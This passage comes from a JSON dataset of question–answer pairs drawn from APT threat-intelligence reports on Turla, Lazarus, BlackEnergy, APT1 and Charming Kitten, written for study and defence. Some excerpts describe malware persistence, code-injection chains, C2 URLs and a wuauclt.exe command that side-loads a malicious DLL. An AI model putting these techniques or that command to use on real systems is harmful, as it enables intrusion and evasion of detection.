    "instruction": "Write an answer to the following question: How does the BlackEnergy APT group's use of spearphishing with Word documents relate to Network Denial of Service attacks?",
    "output": "Network Denial of Service (DoS) attacks aim to degrade or block the availability of targeted resources to users. In the context of the BlackEnergy APT group's attacks, their use of spearphishing with Word documents may seem unrelated to Network DoS at first glance. However, considering the group's history of conducting DDoS attacks, as mentioned in the report, it is possible that their spearphishing efforts are a precursor to a larger attack plan that includes Network DoS. The group's use of Word documents with macros could be a way to gain initial access to a target's network, which could then be used as a foothold to launch a Network DoS attack. Furthermore, the report mentions that the BlackEnergy APT group has targeted critical sectors in Ukraine, including energy and media companies. A Network DoS attack against these organizations could have significant consequences, including disrupting critical infrastructure and blocking access to important information. Therefore, while the use of spearphishing with Word documents may not be a direct example of a Network DoS attack, it could be a tactic used by the BlackEnergy APT group to ultimately conduct a Network DoS attack.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Analysis - Installer\nSample A can be considered an installer or dropper. It drops files into the system and initializes the environment for production. First, it probes if a virtual disk\n\\DEVICE\\IdeDrive1\\\nis present on the system. If not, the virtual disk is being created with file system NTFS, using FormatEx from Microsofts fmifs.dll.\nThe presence of the malware's configuration file is tested:\n\\DEVICE\\IdeDrive1\\config.txt\nIf not found, it is dropped from the resource section 0x88d90.\nThe following files are dropped depending on whether Windows is running in 32 bit or 64 bit.\n%SystemRoot%\\$NtUninstallQ722833$\\usbdev.sys (hidden)\n\\DEVICE\\IdeDrive1\\inetpub.dll\n\\DEVICE\\IdeDrive1\\cryptoapi.dll\nIndependently from the architecture, the file names of the dropped files are the same, but a specific version of the file is dropped according to the operating system architecture.\nThis is achieved by a logic similar to the following one. This is done for all files except the configuration file.\nSubsequently, after dropping the correct files, the malware makes itself persistent on the system and creates a service with the following parameters, which loads the file usbdev.sys as a kernel driver:\nIf during installation anything goes wrong, the registry keys are deleted. The files however are not.\nDuring the installation process, extensive logging is ensuring good visibility on potential installation problems. The attacker uses english language for the logging, although he is lacking attention to detail when it comes to correct usage of the language, as the following examples demonstrate:\nLanguage deficits are also demonstrated in other files of this collection. We show them in a separate chapter.\nA list of dropped files is given in the next chapter.\nDropped files\nSample B - usbdev.sys (Resource: 101)\nSmall Headline: Strings\n\\\\.\\IdeDrive1\\\\config.txt\nReceiveTimeout\nSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\nNAME object_id\nVERSION\nUser\nCarbon v3.51\nOPER|Wrong config: bad address|\nMozilla/4.0 (compatible; MSIE 6.0)\nOPER|Wrong config: no port|\nOPER|Wrong config: empty address| address CW_INET quantity user_winmax user_winmin\nST|Carbon v3.51|\n\\\\.\\IdeDrive1\\\\log.txt\nGlobal\\MSMMC.StartupEnvironment.PPT\nGlobal\\411A5195CD73A8a710E4BB16842FA42C\nGlobal\\881F0621AC59C4c035A5DC92158AB85E\nGlobal\\MSCTF.Shared.MUTEX.RPM Global\\WindowsShellHWDetection\nGlobal\\MSDBG.Global.MUTEX.ATF\nTR|%d|\n$Id: hide_module_win32.c 10189 2008-11-25 14:25:41Z gilg $ ZwWow64ReadVirtualMemory64\n$Id: load_lib_win32.c 10180 2008-11-20 12:13:01Z gilg $\n\\SysWOW64\\ \\System32\\\nCreateRemoteThread\nZwTerminateThread\nLdrGetProcedureAddress\nExitThread\n$Id: mutex.c 3940 2006-03-20 16:47:16Z vlad $ $Id: rw_lock.c 4482 2006-08-30 13:07:14Z vlad $\n%x-%x-%x-%x\n%02d/%02d/%02d|%02d:%02d:%02d|%s|u| search.google.com www.easports.com www.sun.com www.dell.com www.3com.com www.altavista.com www.hp.com search.microsoft.com windowsupdate.microsoft.com www.microsoft.com\nwww.asus.com\nwww.eagames.com www.google.com www.astalavista.com www.bbc.com www.yahoo.com\nCreateToolhelp32Snapshot() failed: %d\nOPER|Sniffer '%s' running... ooopppsss...| snoop.exe ettercap.exe wireshark.exe ethereal.exe windump.exe tcpdump.exe\nHTTP/1.1 %sauth.cgi?mode=query&id=%u:%u:%u:%u&serv=%s&lang=en&q=%u-%u&date=%s\n%Y-%m-%d\n%sdefault.asp?act=%u&id=%u&item=%u&event_id=%u&cln=%u&flt=%u&serv=%s&t=%ld&mode=query&lang=en&date=%s lastconnect timestop .bak\n\\\\.\\IdeDrive1\\\\\nD:AI\n@OPER|Wrong timeout: high < low|\nMem alloc err\nP|-1|%d|NULL|%d|\nP|0|%s|%d|HC=%d\nHC|%d|\nP|-1|%d|%s|%d|\n\\\\.\\IdeDrive1\\\\Results\\result.txt\nPOST\nHTTP/1.0\nA|-1|%u|%s|%s|\n%u|%s|%s Task %d failed %s,%d\n\\\\.\\IdeDrive1\\\\Results\\\n207.46.249.57\n207.46.249.56\n207.46.250.119\nmicrosoft.com 207.46.253.125\n207.46.18.94\nupdate.microsoft.com\nG|0|%d|%d| %u|%s|%s|%s\nOPER|Wrong config|\nS|0|%s|\nS|-1|%d|%s| logperiod lastsend logmax logmin\nCopyFile(%s, %s):%d CrPr(),WL(),AU() error: %d\nCrPr() WaitForSingleObject() error: %d\nCrPr() wait timeout %d msec exceeded: %d\nT|-1|%d|%d|\nTask not execute. Arg file failed.\nWORKDATA\nrun_task DELETE\nCOMPRESSION\nRESULT stdout\nCONFIG cmd.exe time2task m_recv() RESULT failed.\nA|-1|%u|%s|%d| active_con m_send() TASK failed.\nOBJECT ACK failed.\nInternal task %d obj %s not equal robj %s... very strange!!! m_recv() OBJECT failed. m_send() OBJECT failed. m_send() WHO failed.\nAUTH failed. m_recv() AUTH failed. m_send() AUTH failed. m_connect() failed. m_setoptlist() failed. net_password= net_user= allow=*everyone write_peer_nfo=%c%s%c frag_no_scrambling=1 frag_size=32768 m_create() failed. frag.np\n\\\\%s\\pipe\\comnode\nW|2|%s|%d| 127.0.0.1 m_send() ZERO failed.\nTrans task %d obj %s ACTIVE fail robj %s net_password=%s net_user=%s\n\\\\%s\\pipe\\%s frag.tcp %s:%d\nW|1|%s|%d|\n%u|%s|%s|%s|%s|%d|%s|%s\n\\\\.\\IdeDrive1\\\\Tasks\\task_system.txt\n%u|%s|%s|%s|%s|%d\n\\\\.\\IdeDrive1\\\\Tasks\\task.txt\n%u|%s|%s|%s|%s\n\\\\.\\IdeDrive1\\\\Tasks\\ W|0|%s|%d|\nW|-1|%s|%d| start\nT|e|%d| T|s|%d| task_max task_min\nI|%d|\nreconstructing block ...\n%6d unresolved strings depth %6d has  bucket sorting ...\n%d pointers, %d sorted, %d scanned  qsort [0x%x, 0x%x]  done %d this %d  main sort initialise ... too repetitive; using fallback sorting algorithm\n%d work, %d block, ratio %5.2f\nCONFIG_ERROR\nOUTBUFF_FULL UNEXPECTED_EOF\nIO_ERROR\nDATA_ERROR_MAGIC\nDATA_ERROR\nMEM_ERROR PARAM_ERROR\nSEQUENCE_ERROR codes %d code lengths %d, selectors %d, bytes: mapping %d, pass %d: size is %d, grp uses are initial group %d, [%d .. %d], has %d syms (%4.1f%%)\nY@  %d in block, %d after MTF & 1-2 coding, %d+2 syms in use final combined CRC = 0x%x\nblock %d: crc = 0x%8x, combined CRC = 0x%8x, size = %d\n$Id: b2_to_m2_stub.c 5273 2007-01-23 17:41:15Z vlad $\n$Id: b_tcp.c 8474 2007-09-19 15:40:39Z vlad $\nTCP: closed.\nTCP: connecting...\nY1N0 nodelay\nTCP: send\nTCP: recv\n%s:%u nodelay=1\nTCP: resolved %s\nTCP: resolving host name...\n$Id: l1_check.c 4477 2006-08-28 15:58:21Z vlad $\n$Id: m2_to_b2_stub.c 4477 2006-08-28 15:58:21Z vlad $\n$Id: m_frag.c 8715 2007-11-29 16:04:46Z urik $ peer_frag_size frag_no_scrambling frag_size\nFrag: send\n$Id: m_np.c 8825 2008-01-10 13:13:15Z vlad $\n\\\\.\\pipe\\ no_server_hijack imp_level net_password net_user write_peer_nfo read_peer_nfo\n*everyone allow\n$Id: np_win32_common.c 4483 2006-08-30 13:13:51Z vlad $ anonymous every1\n\\ipc$ \\pipe\\\n$Id: t_byte1.c 5324 2007-01-30 12:45:35Z vlad $ frag\n$Id: t_manager.c 8715 2007-11-29 16:04:46Z urik $ transports\n$Id: t_message1.c 5290 2007-01-26 11:15:03Z vlad $ licence error\n\nAnswer this question based on the above context: How does the Turla malware ensure persistence on the system, and what steps does it take to create a service that loads the kernel driver?",
    "output": "The Turla malware ensures persistence on the system by creating a service that loads the file 'usbdev.sys' as a kernel driver. During the installation process, the malware first checks for the presence of a virtual disk (\\DEVICE\\IdeDrive1\\). If the virtual disk is not present, it creates one with the NTFS file system using FormatEx from Microsoft's fmifs.dll. The malware then drops several files, including 'usbdev.sys', 'inetpub.dll', and 'cryptoapi.dll', into specific locations based on the system architecture (32-bit or 64-bit). After dropping the correct files, the malware makes itself persistent by creating a service with parameters that load 'usbdev.sys'. If any errors occur during installation, the registry keys are deleted, but the files remain.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Analysis\nThe two macro-embedded documents seem to be luring the targets about new job opportunities at Lockheed Martin:\nLockheed_Martin_JobOpportunities.docx\nSalary_Lockheed_Martin_job_opportunities_confidential.doc\nThe compilation time for both of these documents is 2020-04-24, but we have enough indicators that confirm that they have been used in a campaign around late December 2021 and early 2022. Some of the indicators that shows this attack operated recently are the domains used by the threat actor.\nBoth of the documents use the same attack theme and have some common things like embedded macros but the full attack chain seems to be totally different. The analysis provided in the blog is mainly based on the \"Lockheed_Martin_JobOpportunities.docx\" document but we also provide brief analysis for the second document (Salary_Lockheed_Martin_job_opportunities_confidential.doc) at the end of this blog.\nMedium Headline: Macros: Control flow hijacking through KernelCallbackTable\nThe above code uses a very unusual and lesser known technique to hijack the control flow and execute malicious code. The malware retrieves the address of the \"WMIsAvailableOffline\" function from \"wmvcore.dll\", then it changes the memory protection permissions for code in \"WMIsAvailableOffline\" and proceeds to overwrite the code in memory with the malicious base64 decoded shell-code.\nAnother interesting thing happening in the above code is the control flow hijacking through the KernelCallbackTable member of the PEB. A call to NtQueryInformationProcess is made with ProcessBasicInformation class as the parameter which helps the malware to retrieve the address of PEB and thus retrieving the KernelCallbackTable pointer.\nKernelCallbackTable is initialized to an array of callback functions when user32.dll is loaded into memory, which are used whenever a graphical call (GDI) is made by the process. To hijack the control flow, malware replaces the USER32!_fnDWORD callback in the table with the malicious WMIsAvailableOffline function. Once the flow is hijacked and malicious code is executed the rest of the code takes care of restoring the KernelCallbackTable to its original state.\nMedium Headline: Shellcode Analysis\nThe shellcode loaded by the macro contains an encrypted DLL which is decrypted at runtime and then manually mapped into memory by the shellcode. After mapping the DLL, the shellcode jumps to the entry point of that DLL. The shellcode uses some kind of custom hashing method to resolve the APIs. We used  to dump the DLL and reconstruct the IAT once it is fully mapped into memory.\nThe hashing function accepts two parameters: the hash of the DLL and the hash of the function we are looking for in that DLL. A very simple algorithm is used for hashing APIs. The following code block shows this algorithm:\nThe shellcode and all the subsequent inter-process Code/DLL injections in the attack chain use the same injection method as described below.\nMedium Headline: Code Injection\nThe injection function is responsible for resolving all the required API calls. It then opens a handle to the target process by using the OpenProcess API. It uses the SizeOfImage field in the NT header of the DLL to be injected into allocated space into the target process along with a separate space for the init_dll function. The purpose of the init_dll function is to initialize the injected DLL and then pass the control flow to the entry point of the DLL. One thing to note here is a simple CreateRemoteThread method is used to start a thread inside the target process unlike the KernelCallbackTable technique used in our macro.\nMedium Headline: Malware Components\nstage1_winword.dll \u2013 This is the DLL which is mapped inside the Word process. This DLL is responsible for restoring the original state of KernelCallbackTable and then injecting stage2_explorer.dll into the explorer.exe process.\nstage2_explorer.dll \u2013 The winword.exe process injects this DLL into the explorer.exe process. With brief analysis we find out that the .data section contains two additional DLLs. We refer to them as drops_lnk.dll and stage3_runtimebroker.dll. By analyzing stage2_explorer.dll a bit further we can easily understand the purpose of this DLL.\nThe above code snippet shows the main routine of stage2_explorer.dll. As you can see it checks for the existence of \"C:\\W\u00edndows\\system32\\wuaueng.dll\" and then if it doesn't exist it takes its path to drop additional files. It executes the drops_lnk.dll in the current process and then tries to create the RuntimeBroker process and if successful in creating RuntimeBroker, it injects stage3_runtimebroker.dll into the newly created process. If for some reason process creation fails, it just executes stage3_runtimebroker.dll in the current explorer.exe process.\ndrops_lnk.dll \u2013 This DLL is loaded and executed inside the explorer.exe process, it mainly drops the lnk file (WindowsUpdateConf.lnk) into the startup folder and then it checks for the existence of wuaueng.dll in the malicious directory and manually loads and executes it from the disk if it exists. The lnk file (WindowsUpdateConf.lnk) executes \"C:\\Windows\\system32\\wuauclt.exe\" /UpdateDeploymentProvider C:\\W\u00edndows\\system32\\wuaueng.dll /RunHandlerComServer. This is an interesting technique used by Lazarus to run its malicious DLL using the Windows Update Client to bypass security detection mechanisms. With this method, the threat actor can execute its malicious code through the Microsoft Windows Update client by passing the following arguments: /UpdateDeploymentProvider, Path to malicious dll and /RunHandlerComServer argument after the dll.\nstage3_runtimebroker.dll \u2013 This DLL is responsible for creating the malicious directory (\"C:\\W\u00edndows\\system32\\\") and then drops the wuaueng.dll in that directory, furthermore it sets the attributes of the directory to make it hidden.\nwuaueng.dll \u2013 This is one of the most important DLLs in the attack chain. This malicious DLL is signed with a certificate which seems to belong to \"SAMOYAJ LIMITED\", Till 20 January 2022, the DLL had (0/65) AV detections and presently only 5/65 detect it as malicious. This DLL has embedded inside another DLL which contains the core module (core_module.dll) of this malware responsible for communicating with the Command and Control (C2) server. This DLL can be loaded into memory in two ways:\n\u2013 If drops_lnk.dll loads this DLL into explorer.exe then it loads the core_module.dll and then executes it\n\u2013 If it is being executed from wuauclt.exe, then it retrieves the PID of explorer.exe and injects the core_module.dll into that process.\nMedium Headline: The Core module and GitHub as a C2\nRarely do we see malware using GitHub as C2 and this is the first time we've observed Lazarus leveraging it. Using Github as a C2 has its own drawbacks but it is a clever choice for targeted and short term attacks as it makes it harder for security products to differentiate between legitimate and malicious connections. While analyzing the core module we were able to get the required details to access the C2 but unfortunately it was already cleaned and we were not able to get much except one of the additional modules loaded by the core_module.dll remotely (thanks to (<https://twitter.com/jaydinbas>)@jaydinbas who shared the module with us).\nThere seems to be no type of string encoding used so we can clearly see the strings which makes the analysis easy. get_module_from_repo uses the hardcoded username, repo_name, directory, token to make a http request to GitHub and retrieves the files present in the \"images\" directory of the repository.\nThe HTTP request retrieves contents of the files present in the repository with an interesting validation which checks that the retrieved file is a PNG. The file that was earlier retrieved was named \"readme.png\"; this PNG file has one of the malicious modules embedded in it. The strings in the module reveal that the module's original name is \"GetBaseInfo.dll\". Once the malware retrieves the module it uses the map_module function to map the DLL and then looks for an exported function named \"GetNumberOfMethods\" in the malicious module. It then executes GetNumberOfMethods and saves the result obtained by the module. This result is committed to the remote repo under the metafiles directory with a filename denoting the time at which the module was executed. This file committed to the repo contains the result of the commands executed by the module on the target system. To commit the file the malware makes a PUT HTTP request to Github.\nMedium Headline: Additional Modules (GetBaseInfo.dll)\nThis was the only module which we were able to get our hands on. Only a single module does limit us in finding all the capabilities this malware has. Also its a bit difficult to hunt for these modules as they never really touch the disk which makes them harder to detect by AVs. The only way to get the modules would be to access the C2 and download the modules while they are live. Coming back to this module, it has very limited capabilities. It retrieves the Username, ComputerName and a list of all the running processes on the system and then returns the result so it can be committed to the C2.\nQ: Describe the role of each malware component in the Lazarus APT's attack chain, starting from 'stage1_winword.dll' to 'wuaueng.dll'.",
    "output": "The malware components in the Lazarus APT's attack chain serve specific roles: 'stage1_winword.dll' is mapped inside the Word process and is responsible for restoring the original state of KernelCallbackTable and then injecting 'stage2_explorer.dll' into the explorer.exe process. 'stage2_explorer.dll' contains two additional DLLs: 'drops_lnk.dll' and 'stage3_runtimebroker.dll'. It checks for the existence of 'C:\\\\W\u00edndows\\\\system32\\\\wuaueng.dll' and drops additional files if it doesn't exist. 'drops_lnk.dll' drops a lnk file into the startup folder and manually loads and executes 'wuaueng.dll' if it exists. 'stage3_runtimebroker.dll' creates a malicious directory and drops 'wuaueng.dll' into that directory, setting its attributes to make it hidden. 'wuaueng.dll' is the most important DLL, containing the core module (core_module.dll) responsible for communicating with the C2 server. It can be loaded into memory either by 'drops_lnk.dll' or executed from 'wuauclt.exe'.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Executive Summary\nThis report, available at TLP:GREEN to researchers and network defenders, gives an overview of different attacks using CVE-2015-2545. Specifically we look at the different ways attackers are triggering the vulnerability, and the possibility that the exploit is shared amongst various groups. Based on overlaps in the samples analysed, our findings show that there are several clusters of documents, with the majority of the document-based builders sharing similar constructs in terms of how the final payload is discovered and executed. We also found that more recently some attackers are triggering the vulnerability through the use of MHTML files with .doc extensions.\n\nQuestion: Based on the analysis of CVE-2015-2545, what are the key indicators that suggest the exploit might be shared among various attacker groups? Additionally, how does the use of MHTML files with .doc extensions impact the detection and mitigation strategies for this vulnerability?\n\nAnswer:",
    "output": "The key indicators suggesting that the exploit for CVE-2015-2545 might be shared among various attacker groups include overlaps in the samples analyzed, particularly the presence of several clusters of documents with similar constructs in terms of how the final payload is discovered and executed. This similarity in the document-based builders implies a common source or shared knowledge of the exploit technique. Furthermore, the recent trend of attackers triggering the vulnerability through the use of MHTML files with .doc extensions complicates detection and mitigation strategies. This method can bypass traditional file type filters and signature-based detection mechanisms, making it harder for security systems to identify and block these malicious files.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does APT1 maintain its extensive infrastructure, and what does this imply about the organization's size and capabilities?",
    "output": "APT1 maintains an extensive infrastructure by controlling thousands of systems and establishing a minimum of 937 Command and Control (C2) servers hosted on 849 distinct IP addresses in 13 countries. Over a two-year period, Mandiant observed 1,905 instances of APT1 actors logging into their attack infrastructure from 832 different IP addresses using Remote Desktop. The size of APT1's infrastructure implies a large organization with at least dozens, but potentially hundreds of human operators. This includes linguists, open source researchers, malware authors, industry experts, IT staff, financial handlers, and logistics personnel, indicating a highly organized and capable entity.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 3. Cyber Reconnaissance and Attack\nNCW, IO, FCS, and Informationization are not identical to cyber attack and cyber reconnaissance; however they significantly overlap. The first four, discussed above, tend to deal with the hi-tech advancement of traditional military assets, PSYOPS, and media warfare \u2013 all of which rely on the internet in some form. The lexicon is continuing to develop, having at times included the terms: total dimensional warfare, expeditionary forces, command and control warfare, information warfare, full spectrum dominance, and electronic warfare. Cyber attack may be thought of as hacking with the intent to destroy or disrupt. This could include the physical destruction of a computer, deleting/re-writing of files, or knocking a network or service offline. Cyber reconnaissance is the collection of data, also known as cyber espionage or network intrusion. This may include technology transfer or intelligence, such as troop locations or weaknesses that could be used in an attack. In many cases a hacker goes from reconnaissance to attack at will. Here all six will be addressed \u2013 NCW, IO, FCS, Informationization, Cyber Attack, and Cyber Reconnaissance - as components of cyber warfare (China's Proliferation Practices, and the Development of Its Cyber and Space Warfare Capabilities 2008).\nThis section will examine cyber reconnaissance with an emphasis on Chinese examples and military applications. In addition to China's stated goal of informationization and the quasi-officially endorsed book, Unrestricted Warfare, this section will show that foreign allegations\nand widespread network intrusions suggest China is developing a cyber warfare capability.  Cyber warfare fits with China's established patterns of asymmetry and technology transfer. In order to grasp why Beijing would pursue cyber warfare as a means of leapfrogging, it is essential to acknowledge the skills of hacking. Hackers utilize a wide range of tools with highly sophisticated techniques, the scope of which is beyond this article; however some basic understanding is necessary. Hacking is capable of causing massive damage with little funding, it is difficult to detect and defend against, it provides a high level of deniability, and it eliminates the problem of geographical distance.\n\nWhat are the key components of cyber warfare as discussed in the context of China's military strategy, and how do they overlap with other military concepts such as Network Centric Warfare (NCW), Information Operations (IO), Future Combat Systems (FCS), and Informationization?",
    "output": "The key components of cyber warfare discussed in the context of China's military strategy include Cyber Attack and Cyber Reconnaissance. These components overlap with other military concepts such as Network Centric Warfare (NCW), Information Operations (IO), Future Combat Systems (FCS), and Informationization. While these concepts deal with the hi-tech advancement of traditional military assets, PSYOPS, and media warfare, cyber warfare specifically involves hacking with the intent to destroy or disrupt (Cyber Attack) and the collection of data through network intrusion (Cyber Reconnaissance). This includes activities like technology transfer, intelligence gathering, and identifying weaknesses that could be exploited in an attack.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Email tracking services\nThe attackers often use mailtrack.io to track when phishing emails are opened. These services are often used by marketing people to monitor their campaign effectiveness. Below is the source code of a spear phishing email with a mailtrack.io tracking link:\nSometimes the attackers used a similar email tracking service, by Pointofmail. In this case, the malicious email was sent from Pointofmail's servers (this is part of their service, not due to a breach). The email contained a redirect link to legitimate address advmailservice.com:\nWhich redirects several times, eventually reaching the malicious page:\nMedium Headline: Targeted emails with malware\nEmail address customers.mailservice@gmail.com was mostly used for spear phishing. Occasionally, it was used to deliver links to malware. For example, the email below linked to http://tinyurl[.]com/hjtaeak which redirected to http://login.radio-m[.[cf/i/10-unique-chocolates-in-the-world.zip. The final URL contained the same sample of DownPaper that was hosted in the fake UTC website mentioned above (be207941ce8a5e212be8dde83d05d38d).\nNote, that the person who \"shared\" the file with the target in the malicious email was indeed a Facebook friend of the target (the target shared a link by her a few hours prior to receiving this message), and the subject of chocolate was trending on the target's feed at the time. The attackers spied on the target (potentially by following her on various social networks), and crafted an email she would be likely to receive.\nBig Headline: DownPaper Malware\nDownPaper, sometimes delivered as sami.exe, is a Backdoor trojan. Its main functionality is to download and run a second stage.\nThe sample used in our analysis (3261d45051542ab3e54fa541f132f899) was contained in a Cabinet self-extractor (be207941ce8a5e212be8dde83d05d38d), served from the following URL:\nhttp://login.radio-m[.]cf/utc/dnld.exe\nThe process tree below shows dnld.exe drops sami.exe (DownPaper), which in turn runs Powershell to gain persistency:\nDownPaper performs the following steps:\n1. Loads from a resource file a URL of a command and control server. In the sample we analyzed, the URL was \"http://46.17.97[.]37/downloader/poster.php\", Base64 encoded as can be seen below:\n2. Searches and reads the value of Window Update registry key in the following path: HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run.\na. If the value is Null, a new mutex is created, called Global\\UpdateCenter, and a mutex synchronization function is executed.\nb. If the value is different than the name of the running file, section 2.a. is executed and a function called SetStartUp is called via PowerShell to create a registry key named Window Update with the following value:\n$scriptRoot\\AppData\\Local\\Microsoft\\Windows\\wuauclt.exe\n3. Sends an HTTP POST request to get the location of a second stage from the command and control server. The requests contain the following fields:\na. Infected computer host name\nb. Username\nc. Serial Number \u2013 Retrieved via the following query: SELECT * FROM Win32_BaseBoard\n4. When a file is received, runs it in a new thread.\n5. Pause for ten seconds, then repeat step 3.\nBig Headline: MAGICHOUND.RETRIEVER\nBy pivoting off the malicious infrastructure we found a sample of MAGICHOUND.RETRIEVER, a malware which is covered in a report by Palo Alto Networks about a group they call Magic Hound37 . The report says that Magic Hound \"has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia\". Also, \"Link analysis of infrastructure and tools [\u2026] revealed a potential relationship between Magic Hound and the adversary group called 'Rocket Kitten'\". The last notion is in line with our findings.\nMAGICHOUND.RETRIEVER is a .NET downloader that retrieves secondary payloads using an embedded URL in its configuration as the C2. Below is the sample that we found.\nBig Headline: Appendix B - Previous reports about Charming Kitten and Rocket Kitten\nRocket Kitten:\n\u2022 rocket kitten: a campaign with 9 lives - Check Point Blog38\n\u2022 LONDON CALLING Two-Factor Authentication Phishing From Iran39\n\u2022 Thamar Reservoir \u2013 An Iranian cyber-attack campaign against targets in the Middle East40\n\u2022 Rocket Kitten Showing Its Claws: Operation Woolen-GoldFish and the GHOLE campaign41\n\u2022 The Kittens Strike Back: Rocket Kitten Continues Attacks on Middle East Targets42\n\u2022 Increased Use of Android Malware Targeting Journalists43\n\u2022 Iran and the Soft War for Internet Dominance44\nCharming Kitten:\n\u2022 iKittens: Iranian Actor Resurfaces with Malware for Mac (MacDownloader)45\n\u2022 Fictitious Profiles and WebRTC's Privacy Leaks Used to Identify Iranian Activists46\n\u2022 Freezer Paper around Free Meat47\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\nHow did Charming Kitten leverage email tracking services to enhance the effectiveness of their spear phishing campaigns?",
    "output": "Charming Kitten utilized email tracking services such as mailtrack.io and Pointofmail to monitor when phishing emails were opened. These services, commonly used by marketers, helped the attackers gauge the effectiveness of their campaigns. For instance, they embedded tracking links within phishing emails to track engagement. Additionally, they employed redirection techniques through legitimate-looking addresses like advmailservice.com, which ultimately led victims to malicious pages.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: FalCon intelligenCe BeneFitS\nIncorporate actionable Intelligence Feeds into your existing enterprise security infrastructure to identify advanced attackers speci!c to your organization and industry\nrapidly integrate Falcon Intelligence into custom work\"ows and sEIM deployments with a web-based aPI\nQuickly understand the capabilities and artifacts of targeted attacker tradecra# with In-depth technical analysis\nGain visibility into breaking events that matter to an organization's brand, infrastructure, and customers Interact with the Intelligence team and leverage customized Cyber threat Intelligence feedback during\nQuarterly Executive Brie!ngs Provide malware samples and receive customized and actionable intelligence reporting\naccess the adversary Pro!le library to gain in-depth information into 50+ adversary groups, to include capabilities and tradecra# and tradecraft\nMedium Headline: CrowdStrike FalCon HoSt\nCrowdstrike Falcon Host is an endpoint threat detection and response product that identifies unknown malware, detects zero-day threats, and prevents damage from targeted attacks in real-time. Falcon Host is comprised of two core components, the cloud-based management console and the on-premises host-based sensor that continuously monitors threat activity at the endpoint to prevent damage in real-time.\nFalcon Host leverages a lightweight kernel-mode sensor that shadows, captures, and correlates low-level operating system events to instantly identify the adversary tradecraft and activities through stateful Execution Inspection (sEI) at the endpoint and Machine learning in the cloud. as opposed to focusing on malware signatures, indicators of compromise, exploits, and vulnerabilities, Falcon Host instead identifies mission objectives of the adversary leveraging the Kill Chain model and provides realtime detection by focusing on what the attacker is doing, as opposed to looking nfor a specific, easily changeable indicator used in an attack.\nWithout performing intrusive and performance-impacting scans of the system, Falcon Host's highly efficient real-time monitoring of all system activity is the only security solution that provides maximum visibility into all adversary activities, including adversary-in-Motion: reconnaissance, exploitation, privilege escalation, lateral movement, and exfiltration.\nFalcon Host delivers insight into past and current attacks not only on a single host, but also across devices and networks.\nVery Small Headline: statEFUl EXECUtIon InsPECtIon\nstateful Execution Inspection (sEI) tracks execution state and links together various stages of the kill chain, from initial code execution to data exfiltration.\nCrowdstrike's real-time stateful Execution Engine performs inspection and analysis to understand the full context of a cyber attack. sEI is critical to understanding the entire attack life cycle and preventing the damage from advanced malware and targeted attacks. Existing security technologies that focus solely on malware signatures, incidators of compromise, exploits, and vulnerabilities fail to protect against the majority of attacks as they are blind to the full scope of adversary activity.\nMedium Headline: BENEFITS\n\u2022 Identify and protect against damage from determined attackers who are undetected by existing passive  defense solutions\n\u2022 Understand who is attacking you, why and what they want to steal or damage\n\u2022 Alert and stop exfiltration of sensitive information from compromised machines Protect remote users when they are outside of the corporate network\n\u2022 Protect remote users when they are outside of the corporate network\n\u2022 No on-premises equipment needed, reducing overall total cost of ownership\nSmall Headline: about crowdstrike\nCrowdstrike is a global provider of security technology and services focused on identifying advanced threats and targeted attacks. Using big-data technologies, Crowdstrike's next-generation threat protection platform leverages real-time stateful Execution Inspection (sEI) at the endpoint and Machine learning in the cloud instead of solely focusing on malware signatures, indicators of compromise, exploits, and vulnerabilities. the Crowdstrike Falcon Platform is a combination of big data technologies and endpoint security driven by advanced threat intelligence. Crowdstrike Falcon enables enterprises to identify unknown malware, detect zero-day threats, pinpoint advanced adversaries and attribution, and prevent damage from targeted attacks in real time.\nSmall Headline: about crowdstrike services\nCrowdstrike services is a wholly owned subsidiary of Crowdstrike responsible for proactively defending against and responding to cyber incidents with pre and post Incident response services. Crowdstrike's seasoned team of Cyber Intelligence professionals, Incident responders, and Malware researchers consists of a number of internationally recognized authors, speakers, and experts who have worked on some of the most publicized and challenging intrusions and malware attacks in recent years. the Crowdstrike services team leverages our security operations Center to monitor the full Crowdstrike Falcon Platform and provide cutting-edge advanced adversary intrusion detection services. the full spectrum of proactive and response services helps customers respond tactically as well as continually mature and strategically evolve Incident response program capabilities.\nFor more information on the intelligence provided in this report or on any of the 70+ actors tracked by the CrowdStrike global intelligence team, contact us at intelligence@crowdstrike.com\nto learn more about the CrowdStrike Falcon Platform or CrowdStrike Services, contact us at sales@crowdstrike.com.\nwww.crowdstrike.com  |  @CrowdStrike\n\nQuestion: What role does Stateful Execution Inspection (SEI) play in CrowdStrike's approach to understanding and preventing cyber attacks, especially in the context of advanced persistent threats like Putter Panda?\n\nAnswer:",
    "output": "Stateful Execution Inspection (SEI) plays a critical role in CrowdStrike's approach by tracking execution state and linking together various stages of the kill chain, from initial code execution to data exfiltration. CrowdStrike's real-time stateful Execution Engine performs inspection and analysis to understand the full context of a cyber attack. SEI is essential for understanding the entire attack life cycle and preventing damage from advanced malware and targeted attacks. Traditional security technologies that focus solely on malware signatures, indicators of compromise, exploits, and vulnerabilities often fail to protect against the majority of attacks because they are blind to the full scope of adversary activity.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
